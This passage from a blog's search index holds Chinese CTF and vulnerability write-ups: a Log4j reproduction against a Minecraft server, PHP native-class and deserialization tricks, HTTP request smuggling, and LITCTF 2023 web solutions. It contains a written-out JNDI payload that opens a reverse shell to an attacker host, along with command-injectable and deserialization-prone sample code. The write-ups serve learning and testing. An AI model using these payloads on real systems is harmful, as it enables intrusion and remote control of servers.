<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Minecraft-ApacheLog4j</title>
    <link href="/2023/10/10/Minecraft-ApacheLog4j/"/>
    <url>/2023/10/10/Minecraft-ApacheLog4j/</url>
    
    <content type="html"><![CDATA[<h1 id="Minecraft中的Log4j漏洞复现"><a href="#Minecraft中的Log4j漏洞复现" class="headerlink" title="Minecraft中的Log4j漏洞复现"></a>Minecraft中的Log4j漏洞复现</h1><h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><ul><li>Minecraft服务器一台(靶机IP:<code>targeted_ip</code>)</li><li>攻击机一台(攻击机IP:<code>hacking_ip</code>)</li></ul><h2 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h2><p>下载工具<a href="https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2">JNDIExploit</a></p><p>根据操作文档：</p><p><img src="/2023/10/10/Minecraft-ApacheLog4j/image-20231010012501634.png"></p><p>在攻击机上开启jndi服务：</p><p><img src="/2023/10/10/Minecraft-ApacheLog4j/image-20231010012620627.png"></p><p>攻击机开启监听端口：</p><p><img src="/2023/10/10/Minecraft-ApacheLog4j/image-20231010012824170.png"></p><p>根据操作文档，构造：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldap:<span class="hljs-regexp">//</span>hacking_ip:<span class="hljs-number">1389</span><span class="hljs-regexp">/Basic/</span>ReverseShell<span class="hljs-regexp">/hacking_ip/</span><span class="hljs-number">7890</span><br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://hacking_ip:1389/Basic/ReverseShell/hacking_ip/7890&#125;</span><br></code></pre></td></tr></table></figure><p>在聊天框内输入payload：</p><p><img src="/2023/10/10/Minecraft-ApacheLog4j/image-20231010013207406.png"></p><p>反弹shell：</p><p><img src="/2023/10/10/Minecraft-ApacheLog4j/image-20231010013318644.png"></p><p>可能导致线程崩溃，拿到shell之后重新开服即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php原生类</title>
    <link href="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><h3 id="error-PHP7-8"><a href="#error-PHP7-8" class="headerlink" title="error:(PHP7,8)"></a>error:(PHP7,8)</h3><h3 id="Exception-PHP5-7-8"><a href="#Exception-PHP5-7-8" class="headerlink" title="Exception:(PHP5,7,8)"></a>Exception:(PHP5,7,8)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921213423344.png"></p><p>那，既然这样，那我有个大胆的想法。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921215011666.png"></p><p>当然通常环境下，开发者通常也不会在程序内留下可控的创建新类对象，可能会有以下的情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候我们编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">/*O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A36%3A%22C%3A%5CUsers%5Clinfe%5CDesktop%5Cclass%5Cser.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D*/</span><br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230922013804931.png"></p><h3 id="DirectoryIterator-PHP5-7-8"><a href="#DirectoryIterator-PHP5-7-8" class="headerlink" title="DirectoryIterator:(PHP5,7,8)"></a>DirectoryIterator:(PHP5,7,8)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921211240910.png"></p><h3 id="FilesystemIterator-PHP-5-gt-x3D-5-3-7-8-DirectoryIterator的子类"><a href="#FilesystemIterator-PHP-5-gt-x3D-5-3-7-8-DirectoryIterator的子类" class="headerlink" title="FilesystemIterator:(PHP 5&gt;&#x3D;5.3,7,8,DirectoryIterator的子类)"></a>FilesystemIterator:(PHP 5&gt;&#x3D;5.3,7,8,DirectoryIterator的子类)</h3><p><code>DirectoryIterator</code>和<code>FilesystemIterator</code>均有一个<code>__toString()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921174952966.png"></p><p>结合glob:&#x2F;&#x2F;伪协议可绕过open_basedir的限制：</p><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921175240478.png"></p><h3 id="GlobIterator-PHP-5-gt-x3D-5-3-7-8"><a href="#GlobIterator-PHP-5-gt-x3D-5-3-7-8" class="headerlink" title="GlobIterator:(PHP 5&gt;&#x3D;5.3,7,8)"></a>GlobIterator:(PHP 5&gt;&#x3D;5.3,7,8)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921211855002.png"></p><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject:"></a>SplFileObject:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20230921212954141.png"></p><h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient:"></a>SoapClient:</h3><h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod:"></a>ReflectionMethod:</h3>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>http请求走私</title>
    <link href="/2023/09/19/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2023/09/19/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h1><p>第一次接触该漏洞是从CSAW2023的一道题：</p><p>&#x2F;&#x2F;emmm比赛环境关闭了(尬)</p><p>&#x2F;&#x2F;总而言之就是利用CVE-2019-20372的nginx版本1.17.7以下的<a href="https://www.cnblogs.com/null1433/p/12778026.html">http请求走私漏洞</a></p><p>常见的chunked形式的HTTP报文：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?id=1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Transfer-Encodeing</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-livecodeserver"><span class="hljs-number">1</span><span class="hljs-keyword">a</span></span><br><span class="language-livecodeserver"><span class="hljs-keyword">a</span>=To be <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">to</span> be,that </span><br><span class="language-livecodeserver">e</span><br><span class="language-livecodeserver">ia <span class="hljs-keyword">a</span> question.</span><br><span class="language-livecodeserver"><span class="hljs-number">0</span></span><br><span class="language-livecodeserver"></span><br><span class="language-livecodeserver"></span><br></code></pre></td></tr></table></figure><p>1a为十六进制，表示在下一行内容中传输26个字符，使用chunked方式传输内容可以一次性发送，也可以切分后多次发送。0代表传输结束，最后还要加上两个’<code>\r\n</code>‘</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WACONCTF2023</title>
    <link href="/2023/09/15/WACONCTF2023/"/>
    <url>/2023/09/15/WACONCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WACONCTF2023"><a href="#WACONCTF2023" class="headerlink" title="WACONCTF2023"></a>WACONCTF2023</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Litctf2023</title>
    <link href="/2023/08/09/Litctf2023/"/>
    <url>/2023/08/09/Litctf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="LITCTF2023"><a href="#LITCTF2023" class="headerlink" title="LITCTF2023"></a>LITCTF2023</h1><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="My-boss-left"><a href="#My-boss-left" class="headerlink" title="My boss left"></a>My boss left</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Check if the request is a POST request</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-comment">// Read and decode the JSON data from the request body</span><br>    <span class="hljs-variable">$json_data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$login_data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json_data</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// Replace these values with your actual login credentials</span><br>    <span class="hljs-variable">$valid_password</span> = <span class="hljs-string">&#x27;dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk&#x27;</span>;<br><br>    <span class="hljs-comment">// Validate the login information</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$login_data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$valid_password</span>) &#123;<br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;LITCTF&#123;redacted&#125;&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Invalid username or password&#x27;</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>用户输入的密码和$valid_password相同就行了，从源代码可以直接读到密码，签到题不多说</p><p><img src="/2023/08/09/Litctf2023/image-20230809163210352.png"></p><h3 id="unsecure"><a href="#unsecure" class="headerlink" title="unsecure"></a>unsecure</h3><p>根据要求，去&#x2F;welcome</p><p><img src="/2023/08/09/Litctf2023/image-20230809164206433.png"></p><p>去login</p><p><img src="/2023/08/09/Litctf2023/image-20230809164303782.png"></p><p>根据题干给的用户名’admin’，密码’password123’，登录</p><p><img src="/2023/08/09/Litctf2023/image-20230809164559112.png"></p><p>页面重定向到这里：</p><p><img src="/2023/08/09/Litctf2023/image-20230809164642376.png"></p><p>根据提示，而且肉眼可见的url框里url在变，这里使用bp拦截抓个包</p><p>这里有个重定向地址<img src="/2023/08/09/Litctf2023/image-20230809165659671.png"></p><p>又抓到一个&#x2F;ornot的地址：</p><p><img src="/2023/08/09/Litctf2023/image-20230809165858871.png"></p><p><img src="/2023/08/09/Litctf2023/image-20230809165951728.png"></p><p><code>LITCTF&#123;0k4y_m4yb3_1_l13d&#125;</code></p><h3 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h3><p>页面是这样的，看到输入来执行ping命令推测后端存在命令执行语句，那就可能存在任意命令执行漏洞</p><p><img src="/2023/08/09/Litctf2023/image-20230809170638258.png"></p><p>源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, redirect, request<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    output = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        hostname = request.form[<span class="hljs-string">&#x27;hostname&#x27;</span>]<br>        cmd = <span class="hljs-string">&quot;ping -c 3 &quot;</span> + hostname<br>        output = os.popen(cmd).read()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, output=output)<br></code></pre></td></tr></table></figure><p>用管道符连接命令，具体在BUU刷题记录里有</p><p><img src="/2023/08/09/Litctf2023/image-20230809170700018.png"></p><h3 id="amogsus-api"><a href="#amogsus-api" class="headerlink" title="amogsus-api"></a>amogsus-api</h3><p>点开页面如下：</p><p><img src="/2023/08/09/Litctf2023/image-20230809170912194.png"></p><p>给了点提示用postman来做，之前没听说过，先看看源代码吧；</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">from</span> flask_cors <span class="hljs-keyword">import</span> CORS<br><br>app = Flask(__name__)<br>CORS(app)<br><br>con = sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>)<br><br>sessions = []<br><br><span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>  cursor = con.cursor()<br>  cursor.execute(<span class="hljs-string">&#x27;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, sus BOOLEAN)&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Welcome to the amogsus API! I\&#x27;ve been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!&#x27;</span>&#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/signup&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">signup</span>():<br>  <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>    cursor = con.cursor()<br>    data = request.form<br>    <span class="hljs-built_in">print</span>(data)<br>    username = data[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = data[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    sus = <span class="hljs-literal">False</span><br>    cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username=?&#x27;</span>, (username,))<br>    <span class="hljs-keyword">if</span> cursor.fetchone():<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Username already exists!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>      cursor.execute(<span class="hljs-string">&#x27;INSERT INTO users (username, password, sus) VALUES (?, ?, ?)&#x27;</span>, (username, password, sus))<br>      con.commit()<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;User created! You can now login at 